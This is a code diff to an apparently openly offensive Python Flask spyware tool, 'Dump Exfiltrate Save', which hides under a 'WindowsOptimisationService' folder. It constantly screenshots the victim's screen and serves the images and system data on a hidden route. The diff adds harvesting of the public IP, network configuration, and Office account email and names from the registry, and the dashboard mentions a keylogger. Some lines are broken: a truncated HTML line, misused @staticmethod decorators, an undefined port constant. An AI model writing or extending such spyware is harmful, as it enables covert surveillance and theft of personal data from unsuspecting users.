@@ -1,4 +1,3 @@
-# Modules
 import os
 import threading
 import time
@@ -11,47 +10,34 @@ from PIL import Image
 import platform
 import psutil
 import subprocess
+import requests
+import winreg
 
 # Create Flask app
 app = Flask(__name__)
 
 # Create directory function
 def make():
-    # Get current logged user name 
     user_login = os.getlogin()
-    # Define the main directory for the program
     screenShareDir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
-    # Make the main directory
     os.makedirs(screenShareDir, exist_ok=True)
-    # Change the directory path
     os.chdir(screenShareDir)
 
 # Capture images function
 def capture_images():
     global images
     with mss.mss() as sct:
-        # Uses first screen for the capture
         monitor = sct.monitors[1]
-        # Start the capture loop
         while True:
-            # Record the start time to measure the elapsed time for each iteration
             start = time.time()
-            # Define the monitor to capture 
             sct_img = sct.grab(monitor)
-            # Create an image from the captured screen data
             img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
-            # Use a BytesIO object to save the image in memory
             with io.BytesIO() as output:
-                # Save the image in PNG format to the BytesIO object
                 img.save(output, format='PNG')
-                # Append the image data to the 'images' deque 
                 images.append(output.getvalue())
-                # If the number of images exceeds 5, remove the oldest image from the deque
                 if len(images) > 5:
                     images.popleft()
-            # Calculate the elapsed time for the current iteration
             elapsed = time.time() - start
-            # Sleep for the remaining time to maintain a frame rate of 10 FPS
             time.sleep(max(0, 1/120 - elapsed))
 
 # Get local IP function
@@ -114,7 +100,7 @@ dashboard_page = f"""<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="author" content="Fedi6431">
-    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
+    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC
     <meta name="copyright" content="Fedi 2025©">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dump Exfiltrate Save | DES</title>
@@ -163,8 +149,8 @@ dashboard_page = f"""<!DOCTYPE html>
         <button type="button">Stop keylogger</button>
     </div>
     <div id="Usage">
-        <h1>Pc informations</h1>
-        <p>Hey, we have another page for the pc infromations. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
+        <h1>PC informations</h1>
+        <p>Hey, we have another page for the PC information. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
     </div>
 </body>
 </html>"""
@@ -189,8 +175,6 @@ def download_image():
         return send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png')
     return "404 Not Found", 404
 
-import subprocess
-
 @app.route('/16f0ada2144eaa0b96478073d5e3d78b')
 def informations():
     user_login = os.getlogin()  # Get the current logged-in username
@@ -211,21 +195,83 @@ def informations():
         "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
         "Hostname": socket.gethostname(),  # Get the hostname of the machine
         "IP Address": get_local_ip(),  # Get the local IP address
-        "WiFi Networks": wifi_list  # List of available Wi-Fi networks
+        "Public IP": getPublicIp(),  # Get the public IP address
+        "Local Network Info": getLocalNetworkInfo(),  # Get local network configuration
+        "WiFi Networks": wifi_list,  # List of available Wi-Fi networks
+        "Registry User Info": getUserInfoFromRegistry()  # Get user info from the registry
     }
     return jsonify(system_info)
 
 def scan_wifi():
     try:
-        # Execute the command to scan for Wi-Fi networks
         result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
         return result
     except Exception as e:
         return str(e)  # Return the error message if scanning fails
 
+# Static methods for additional functionalities
+@staticmethod
+def getPublicIp():
+    try:
+        return requests.get('https://api.ipify.org').content.decode('utf8')
+    except requests.RequestException as e:
+        return f"Error getting public IP: {str(e)}"
+
+@staticmethod
+def getLocalNetworkInfo():
+    try:
+        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
+        return result.stdout  # Return the standard output
+    except subprocess.CalledProcessError as e:
+        return f"Error executing command: {str(e)}"
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+
+
+@staticmethod
+def getRegistryValue(path, key):
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
+            return winreg.QueryValueEx(keyHandle, key)[0]
+    except FileNotFoundError:
+        return None
+    except Exception as e:
+        return str(e)
+
+@staticmethod
+def getUserInfoFromRegistry():
+    userInfo = {}
+    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
+    
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
+            i = 0
+            while True:
+                try:
+                    subkeyName = winreg.EnumKey(parentKey, i)
+                    subkeyPath = f"{registryPath}\\{subkeyName}"
+                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
+                        email = getRegistryValue(subkeyPath, "EmailAddress")
+                        if email:
+                            userInfo["EmailAddress"] = email
+                        firstName = getRegistryValue(subkeyPath, "FirstName")
+                        if firstName:
+                            userInfo["FirstName"] = firstName
+                        lastName = getRegistryValue(subkeyPath, "LastName")
+                        if lastName:
+                            userInfo["LastName"] = lastName
+                        if len(userInfo) == 3:
+                            break
+                except OSError:
+                    break
+                i += 1
+    except Exception as e:
+        userInfo['Error'] = str(e)
+    
+    return userInfo
 
 if __name__ == "__main__":
     make()
     images = deque(maxlen=5)
     threading.Thread(target=capture_images, daemon=True).start()
-    app.run(host=get_local_ip(), port=31338)
+    app.run(host=get_local_ip(), port=SERVER_PORT)
